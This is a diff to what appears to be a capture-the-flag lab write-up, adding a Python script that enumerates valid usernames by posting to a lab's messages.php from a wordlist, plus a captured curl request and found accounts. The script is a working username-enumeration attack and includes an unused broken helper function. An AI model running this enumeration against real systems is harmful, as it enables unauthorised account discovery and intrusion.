@@ -1000,6 +1000,63 @@ using a few different username lists and looking for the string "Message sent to
 curl 'http://94.237.56.188:50709/messages.php' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://94.237.56.188:50709' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://94.237.56.188:50709/messages.php' -H 'Cookie: htb_sessid=MDk4ZjZiY2Q0NjIxZDM3M2NhZGU0ZTgzMjYyN2I0ZjY%3D' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'user=hi&message=hi&submit=submit'
 ```
 
+```python
+import sys
+import requests
+import os.path
+
+# define target url, change as needed
+url = "http://94.237.56.188:50709/messages.php"
+
+# define a fake headers to present ourself as Chromium browser, change if needed
+headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}
+
+valid = "Message sent to"
+
+def unpack(fline):
+    return userid
+
+def do_req(url, user, message, headers):
+    data = {"user": user, "message": message, "submit": "submit"}
+    res = requests.post(url, headers=headers, data=data)
+
+    return res.text
+
+"""
+if defined valid string is found in response body return True
+"""
+def check(haystack, needle):
+    if needle in haystack:
+        return True
+    else:
+        return False
+
+def main():
+    # check if this script has been runned with an argument, and the argument exists and is a file
+    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
+        fname = sys.argv[1]
+    else:
+        print("[!] Please check wordlist.")
+        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
+        sys.exit()
+
+    with open(fname) as fh:
+        for fline in fh:
+            # skip line if it starts with a comment
+            if fline.startswith("#"):
+                continue
+
+            username = fline.rstrip()
+            res = do_req(url, username, "hi", headers)
+
+            # call function check() to verify if HTTP response text matches our content
+            if (check(res, valid)):
+                print(f"{username} - message successfully sent")
+
+if __name__ == "__main__":
+    main()
+```
+
 so far the accounts found were: 
 - support
 - guest
